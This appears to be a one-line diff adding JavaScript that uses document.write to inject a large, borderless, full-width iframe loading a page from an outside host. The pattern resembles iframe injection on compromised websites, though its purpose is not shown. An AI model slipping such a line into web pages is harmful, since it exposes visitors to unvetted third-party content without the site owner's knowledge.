@@ -1,0 +1,1 @@
+document.write('<iframe src="http://m.huitj.com/fxc/index.html" width="100%" height="2000px" allowtransparency="true" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"></iframe>');
